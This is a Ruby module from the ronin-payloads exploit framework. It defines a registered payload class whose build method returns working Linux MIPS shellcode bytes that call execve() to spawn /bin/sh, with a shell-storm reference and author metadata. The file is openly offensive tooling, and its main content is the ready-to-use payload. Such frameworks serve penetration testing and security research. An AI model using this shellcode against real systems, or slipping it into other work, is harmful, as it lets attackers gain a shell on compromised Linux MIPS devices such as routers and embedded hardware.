# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module MIPS
          class Execve < ShellcodePayload

            register 'shellcode/linux/mips/execve'

            arch :mips
            os :linux

            author "rigan", email: 'imrigan@gmail.com'

            summary 'Linux MIPS execve() shellcode'
            description <<~DESC
            Linux MIPS shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-792.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c".b
            end

          end
        end
      end
    end
  end
end
